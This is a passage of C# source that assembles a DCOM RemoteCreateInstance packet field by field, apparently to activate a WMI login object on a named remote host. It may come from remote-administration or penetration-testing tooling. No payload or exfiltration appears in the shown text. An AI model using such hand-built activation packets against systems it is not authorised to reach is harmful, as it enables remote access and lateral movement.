            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize3", new byte[] { 0x90, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize4", packet_property_data_size);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize5", new byte[] { 0x20, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize6", new byte[] { 0x30, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPrivateHeader", new byte[] { 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesSessionID", new byte[] { 0xff, 0xff, 0xff, 0xff });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesRemoteThisSessionID", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesClientImpersonating", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionIDPresent", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesDefaultAuthnLevel", new byte[] { 0x02, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionGuid", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesProcessRequestFlags", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesOriginalClassContext", new byte[] { 0x14, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesFlags", new byte[] { 0x02, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesReserved", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesUnusedBuffer", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoPrivateHeader", new byte[] { 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiatedObjectClsId", new byte[] { 0x5e, 0xf0, 0xc3, 0x8b, 0x6b, 0xd8, 0xd0, 0x11, 0xa0, 0x75, 0x00, 0xc0, 0x4f, 0xb6, 0x88, 0x20 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoClassContext", new byte[] { 0x14, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoActivationFlags", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoFlagsSurrogate", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInterfaceIdCount", new byte[] { 0x01, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiationFlag", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtr", new byte[] { 0x00, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationEntirePropertySize", new byte[] { 0x58, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMajor", new byte[] { 0x05, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMinor", new byte[] { 0x07, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtrMaxCount", new byte[] { 0x01, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIds", new byte[] { 0x18, 0xad, 0x09, 0xf3, 0x6a, 0xd8, 0xd0, 0x11, 0xa0, 0x75, 0x00, 0xc0, 0x4f, 0xb6, 0x88, 0x20 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsUnusedBuffer", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoPrivateHeader", new byte[] { 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientOk", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved2", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved3", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrReferentID", new byte[] { 0x00, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoNULLPtr", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextUnknown", new byte[] { 0x60, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextCntData", new byte[] { 0x60, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFSignature", new byte[] { 0x4d, 0x45, 0x4f, 0x57 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFFlags", new byte[] { 0x04, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFIID", new byte[] { 0xc0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCLSID", new byte[] { 0x3b, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCBExtension", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFSize", new byte[] { 0x30, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoUnusedBuffer", new byte[] { 0x01, 0x00, 0x01, 0x00, 0x63, 0x2c, 0x80, 0x2a, 0xa5, 0xd2, 0xaf, 0xdd, 0x4d, 0xc4, 0xbb, 0x37, 0x4d, 0x37, 0x76, 0xd7, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoPrivateHeader", packet_private_header);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoAuthenticationFlags", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoPtrReferentID", new byte[] { 0x00, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoNULLPtr", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameReferentID", new byte[] { 0x04, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNULLPtr", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved2", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameMaxCount", packet_target_length);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameOffset", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameActualCount", packet_target_length);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameString", packet_target_unicode);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoPrivateHeader", new byte[] { 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoNULLPtr", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoProcessID", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoApartmentID", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoContextID", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoPrivateHeader", new byte[] { 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoNULLPtr", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrReferentID", new byte[] { 0x00, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestClientImpersonationLevel", new byte[] { 0x02, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestNumProtocolSequences", new byte[] { 0x01, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestUnknown", new byte[] { 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrReferentID", new byte[] { 0x04, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrMaxCount", new byte[] { 0x01, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrProtocolSeq", new byte[] { 0x07, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoUnusedBuffer", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            return packet_DCOMRemoteCreateInstance;
        }
    }
}

